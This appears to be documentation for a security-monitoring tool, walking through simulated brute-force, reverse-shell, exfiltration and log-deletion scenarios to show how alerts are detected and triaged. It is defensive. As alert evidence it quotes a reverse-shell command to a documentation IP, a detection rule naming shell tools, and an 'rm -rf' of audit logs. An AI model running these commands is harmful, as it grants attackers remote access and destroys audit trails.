# Attack Simulation Scenarios

Detailed walkthroughs demonstrating how SecurityScarletAI detects, analyzes, and ranks common attack patterns. Each scenario shows the full pipeline: detection → alert creation → AI explanation → ML triage → risk scoring → correlation → analyst response.

> **Note (2026-06-03):** Prior versions of this document referenced a `src/response/soar.py` module for automated response playbooks. That module has been removed; automated blocking actions in the scenarios below are now performed by the analyst via the dashboard, or by a future endpoint-agent integration. The detection and analysis pipelines are unchanged.

---

## Scenario 1: SSH Brute Force Attack

### Overview

An attacker launches a brute force SSH attack against a bastion host, attempting thousands of login combinations. After many failures, they find valid credentials and gain access.

### Step 1: Detection — Sigma Rule Fires

**Rule**: `SSH Brute Force Detected` (`rules/sigma/authentication/ssh_brute_force.yml`)

```yaml
title: SSH Brute Force Detected
level: high
tags:
  - attack.credential_access
  - attack.ta0006
  - attack.t1110
```

**What happens**: The detection engine counts failed SSH login events from the same source IP. When the count exceeds the threshold (>5 in 5 minutes), an alert is generated.

### Step 2: Alert Created

```json
{
  "rule_name": "SSH Brute Force Detected",
  "severity": "high",
  "host_name": "bastion-host-05",
  "description": "8 failed SSH login attempts from 203.0.113.50 within 5 minutes",
  "mitre_tactics": ["TA0006"],
  "mitre_techniques": ["T1110"],
  "evidence": [
    {"source_ip": "203.0.113.50", "event_action": "failed", "user_name": "root"},
    {"source_ip": "203.0.113.50", "event_action": "failed", "user_name": "admin"}
  ]
}
```

### Step 3: AI Explanation

The alert explanation engine (`src/ai/alert_explanation.py`) generates a human-readable summary using the versioned prompt template `ALERT_EXPLANATION_PROMPT_VERSION = "v1.0.0"`:

> **What happened**: 8 failed SSH login attempts were detected from source IP 203.0.113.50 targeting bastion-host-05 within a 5-minute window. Multiple usernames (root, admin, user) were targeted.
>
> **Why it matters**: This pattern is consistent with credential brute-force attacks (MITRE T1110). The attacker is likely using a dictionary of common usernames and passwords to gain initial access.
>
> **Next steps**: 1) Block source IP 203.0.113.50 at the firewall. 2) Check if any successful logins followed from this IP. 3) Review SSH key configurations on bastion-host-05. 4) Enable fail2ban with stricter thresholds.

If Ollama is unreachable, a template-based fallback (one of 6 category/severity templates) is used instead. The fallback is recorded as `fallback_used=True` in the `LLMResult` returned to the caller.

### Step 4: ML Triage

The triage model (`src/ai/alert_triage.py`) evaluates the alert with 11 features (`AlertTriageModel.FEATURES`):

| Feature | Value | Signal |
|---------|-------|--------|
| `severity_score` | 0.75 (high) | High severity |
| `hour_of_day` | 0.13 (3 AM) | Off-hours |
| `rule_hit_count` | 14 (frequent rule) | Established pattern |
| `host_alert_count` | 7 | Multiple alerts on this host |
| `asset_risk_score` | 0.8 | Internet-facing host |
| `mitre_count` | 1 | Single technique |
| `time_since_last_hours` | 3.2 | Recent similar activity |
| `has_threat_intel` | 1.0 | IP found in AbuseIPDB |
| `command_entropy` | 0.0 | Known commands |
| `session_duration_hours` | 0.08 | Short session (failed auth) |
| `login_hour_deviation` | 0.87 | Far from user's normal login hour |

**Model**: `RandomForestClassifier` (100 estimators, `class_weight="balanced"`) wrapped in `CalibratedClassifierCV` (isotonic, cv=3) for calibrated probability output — probabilities are trustworthy as confidence scores, not just relative rankings.

**Prediction**: `True Positive` with 94% confidence — prioritize for immediate investigation.

### Step 5: Risk Scoring

The risk scoring engine (`src/ai/risk_scoring.py`) combines multiple signals into a single 0-100 risk score:

```
Risk Score: 85/100
├── Base severity (high): 40
├── Threat intel match (+15): 55
├── Asset criticality (bastion host): 70
└── Anomaly (off-hours pattern): 85
```

### Step 6: Correlation Detection

The **Brute Force → Successful Login** correlation rule (`brute_force_success`, severity=critical, confidence_base=80%) detects that a successful SSH login from 203.0.113.50 followed the failed attempts. This creates a second, critical-severity alert via `create_alert()`:

```json
{
  "rule_name": "SSH Successful Login After Failures",
  "severity": "critical",
  "description": "Successful SSH login from 203.0.113.50 after multiple failures"
}
```

The match is also persisted to the `correlation_matches` table with a fresh `correlation_id` (UUID) for audit trail.

### Step 7: What the Dashboard Shows

- **Alerts page**: Two red critical alerts at the top, with severity badges and AI summaries
- **Real-time WebSocket**: New alert toast notification
- **Cases page**: Analyst can create a case linking both alerts, assign to the SOC team, and add investigation notes
- **Hunt page**: Suggested hunt: "Find all successful logins from 203.0.113.50"

### Step 8: Analyst Actions

From the dashboard, the analyst can:

1. **Create a case** — Group the brute force + successful login alerts
2. **Block the IP** — Manual firewall rule via `pf` (`echo 'block drop quick from 203.0.113.50 to any' | sudo pfctl -f -`). Future endpoint-agent integration will automate this.
3. **Run a hunt** — Natural language query: "Show me all activity from 203.0.113.50 this week"
4. **Assign the case** — To the on-call analyst with a severity of `critical`
5. **Document lessons learned** — After resolution, add lessons learned to the case

---

## Scenario 2: Reverse Shell Detection

### Overview

An attacker exploits a web application vulnerability to upload a PHP webshell, then executes a reverse shell to establish a persistent connection back to their C2 server.

### Step 1: Detection — Multiple Rules Fire

**Rule 1**: `Webshell Creation` (severity: critical) — `rules/sigma/file/`

Detects PHP file creation in web-served directories:

```yaml
title: Webshell Creation
level: critical
detection:
    selection_web_dir:
        file_path|contains:
            - /var/www/
    selection_shell_content:
        file_path|endswith: .php
    condition: selection_web_dir and selection_shell_content
```

**Rule 2**: `Reverse Shell Pattern Detected` (severity: critical) — `rules/sigma/process/`

Detects common reverse shell patterns in command lines (7 patterns including `/dev/tcp`, `socat`, `nc -e`, `mkfifo`, etc.).

**Rule 3**: `Outbound Connection to Rare/C2 Port` (severity: high) — `rules/sigma/network/`

Detects outbound connections to port 4444, 31337, 6667, and other known C2 ports.

### Step 2: Alerts Created

Three alerts fire in rapid succession:

| Alert | Severity | Host | Key Evidence |
|-------|----------|------|--------------|
| Webshell Creation | Critical | web-server-01 | `/var/www/html/shell.php` |
| Reverse Shell Pattern | Critical | web-server-01 | `bash -i >& /dev/tcp/203.0.113.50/4444` |
| Outbound Connection to C2 Port | High | web-server-01 | Port 4444 to 203.0.113.50 |

### Step 3: AI Explanation

For the reverse shell alert:

> **What happened**: A reverse shell was detected on web-server-01. The process `bash -i >& /dev/tcp/203.0.113.50/4444 0>&1` established an interactive bash session connecting back to external IP 203.0.113.50 on port 4444.
>
> **Why it matters**: This is a critical indicator of compromise (MITRE T1059). The attacker has gained remote shell access to the host, likely through a web application vulnerability. They now have full control of the system.
>
> **Next steps**: 1) Immediately isolate web-server-01 from the network. 2) Capture a forensic image. 3) Check the webshell for uploaded payloads. 4) Review web application logs for the initial compromise vector. 5) Search other hosts for similar activity.

### Step 4: ML Triage

| Feature | Value | Signal |
|---------|-------|--------|
| `severity_score` | 1.0 (critical) | Maximum severity |
| `has_threat_intel` | 1.0 | IP in C2 threat feed |
| `command_entropy` | 0.0 | Known suspicious command |
| `mitre_count` | 1 | T1059 |

**Prediction**: `True Positive` with 97% confidence.

### Step 5: Correlation

The **Dropped Payload → C2 Callback** correlation rule (`payload_callback`, severity=critical, confidence_base=75%) links the webshell creation with the outbound C2 connection. The match is persisted to `correlation_matches` with a `correlation_id` and surfaced as a critical alert.

### Step 6: What the Dashboard Shows

- **Alerts page**: Three correlated alerts with a shared correlation chain
- **AI Chat**: Analyst asks "What attack chain does this represent?" and gets an explanation of the initial access → execution → C2 pattern
- **MITRE Coverage**: Alerts map to Initial Access, Execution, Command & Control, indicating a multi-stage attack

### Step 7: Analyst Actions

1. **Create a case**: "Reverse Shell on Web Server" — severity: critical
2. **Isolate the host**: Manual `pf` rule blocking web-server-01 at the network level (or future endpoint-agent integration)
3. **Natural language query**: "Show me all processes launched from /var/www/ in the last 24 hours"
4. **Hunt from alert**: Pivot on 203.0.113.50 — "Find all connections to this IP"
5. **Document**: Record the compromise vector (webshell upload) and remediation steps

---

## Scenario 3: Data Exfiltration

### Overview

An insider or compromised account begins exfiltrating large volumes of data through the API gateway, first using bulk downloads and then switching to DNS tunneling when rate limits are applied.

### Step 1: Detection — Sigma Rules

**Rule 1**: `Data Exfiltration Volume` (severity: high) — `rules/sigma/network/`

Detects large outbound data transfers (above a configurable threshold per host over a rolling window).

**Rule 2**: `API Key Usage from New IP` (severity: medium) — `rules/sigma/cloud/`

Detects API key authentication from a previously unseen source IP for a given user.

**Rule 3**: `DNS Tunneling Indicators` (severity: medium) — `rules/sigma/network/`

Detects DNS queries with suspiciously long subdomains, high entropy labels, or anomalous query volumes.

### Step 2: Alerts

| Alert | Severity | Host | Evidence |
|-------|----------|------|----------|
| Data Exfiltration Volume | High | api-gateway-01 | 4.2 GB outbound in 1 hour |
| API Key Usage from New IP | Medium | api-gateway-01 | New IP 198.51.100.42 used svc-data-pipeline key |
| DNS Tunneling Indicators | Medium | api-gateway-01 | 847 queries to `aGVsbG8gd29ybGQ.example.com` in 30 min |

### Step 3: AI Explanation

For the data exfiltration alert:

> **What happened**: An unusual volume of outbound data (4.2 GB) was detected from api-gateway-01 to a single external IP over a 1-hour window. The source user `svc-data-pipeline` authenticated earlier from a new IP (198.51.100.42) not previously associated with this service account.
>
> **Why it matters**: This pattern is consistent with data exfiltration (MITRE T1048 / T1567). The combination of bulk transfer and authentication from a new IP suggests either compromised credentials or malicious insider activity.
>
> **Next steps**: 1) Revoke the `svc-data-pipeline` API key. 2) Block 198.51.100.42 at the network edge. 3) Audit the data accessed by this service account in the past 24 hours. 4) Review DNS logs for tunneling indicators pointing to the same actor.

### Step 4: ML Triage

| Feature | Value | Signal |
|---------|-------|--------|
| `severity_score` | 0.75 (high) | High severity |
| `host_alert_count` | 3 | Multiple correlated alerts |
| `has_threat_intel` | 0.0 | No TI match (yet) |
| `command_entropy` | 0.0 | Standard commands |
| `asset_risk_score` | 0.9 | High-value data host |

**Prediction**: `True Positive` with 89% confidence.

### Step 5: Correlation

The **Large Read → Large Network Transfer** correlation rule (`data_exfiltration`, severity=high, confidence_base=65%) links the file-access pattern with the outbound transfer:

```
Confidence: 65% base, possibly elevated by post-rule threat-intel lookup
```

### Step 6: What the Dashboard Shows

- **Alerts page**: Three correlated alerts forming an exfiltration chain
- **Cases page**: Pre-existing case "Q2 Data Audit" auto-linked via host/asset
- **Risk score chart**: api-gateway-01 risk score jumped from 30 → 88 in the last hour
- **Hunt page**: Suggested hunt: "Find all activity from user svc-data-pipeline in the last 7 days"

### Step 7: Analyst Actions

1. **Create a case**: "Suspected Data Exfiltration via svc-data-pipeline"
2. **Containment**: Revoke the API key, block the source IP, isolate the gateway host if warranted
3. **Forensics**: Pull the enrichment JSONB for affected events (`SELECT enrichment FROM logs WHERE ...`) to see GeoIP, threat intel, and any other enrichment signals
4. **NL→SQL investigation**: "Show me all data downloaded by svc-data-pipeline in the last 30 days, ordered by row count"
5. **Document**: Record the IOCs, attribution if available, and lessons learned

---

## Scenario 4: Insider Privilege Escalation

### Overview

A privileged user abuses their access to escalate to root, then disables audit logging to cover their tracks.

### Step 1: Detection

**Rule 1**: `Privilege Escalation via Sudo` (medium) — `rules/sigma/authentication/`

Detects `sudo` execution events.

**Rule 2**: `Log File Deletion` (critical) — `rules/sigma/file/`

Detects `rm`/`shred`/`srm` targeting `/var/log` files.

### Step 2: Alerts

| Alert | Severity | Host | Evidence |
|-------|----------|------|----------|
| Privilege Escalation via Sudo | Medium | dev-workstation-07 | user `jdoe` ran `sudo -i` then `su -` |
| Log File Deletion | Critical | dev-workstation-07 | `rm -rf /var/log/audit/*` |

### Step 3: AI Explanation

> **What happened**: User `jdoe` escalated privileges via `sudo` then `su -`, and subsequently deleted files under `/var/log/audit/`. The combination is consistent with anti-forensics activity.
>
> **Why it matters**: This is a critical defense-evasion pattern (MITRE T1070). Deleting audit logs after a privilege escalation suggests the user is attempting to hide unauthorized activity.
>
> **Next steps**: 1) Disable `jdoe`'s account immediately. 2) Pull the audit log from the central SIEM (this one) — the local deletion does not affect us. 3) Review the user's prior 30 days of activity for additional anomalies. 4) Engage HR/Legal per incident response policy.

### Step 4: ML Triage

Triage predicts `True Positive` at 96% confidence — the rule combo `sudo` + `log deletion` is highly anomalous in the training distribution.

### Step 5: Correlation

The **Suspicious Activity → Log Deletion** correlation rule (`defense_evasion_cleanup`, severity=high, confidence_base=70%) chains the two events. The match persists to `correlation_matches` and is surfaced as a critical alert.

### Step 6: What the Dashboard Shows

- **Audit log**: Every API call by `jdoe` is in the DB-backed `audit_logs` table, intact
- **Cases**: Pre-built IR template "Insider Threat — Privilege Abuse" available
- **Risk score**: User `jdoe` jumps to 92/100

### Step 7: Analyst Actions

1. **Disable account**: `POST /auth/disable` (admin-only — when endpoint-agent integration lands, this will be automated via AD/LDAP)
2. **Pull audit trail**: Query `audit_logs` for all actions by `jdoe` in the last 90 days
3. **Case creation**: Use the "Insider Threat" template
4. **Coordinate with HR/Legal**: Per organizational policy
5. **Hunt from user**: Pivot on `jdoe` to find any other hosts they accessed

---

## Test Data Generation

To exercise these scenarios in development, use:

```bash
# Generate realistic test alerts (no real IOCs)
poetry run python scripts/generate_attack_data.py --scenario ssh_brute_force

# Or seed the full demo dataset (45+ alerts, 7 correlation chains)
poetry run python scripts/seed_realistic_data.py
```

The generated events go through the full pipeline — Sigma rules fire, correlation chains form, AI explanations render, triage scores compute — without touching external services.
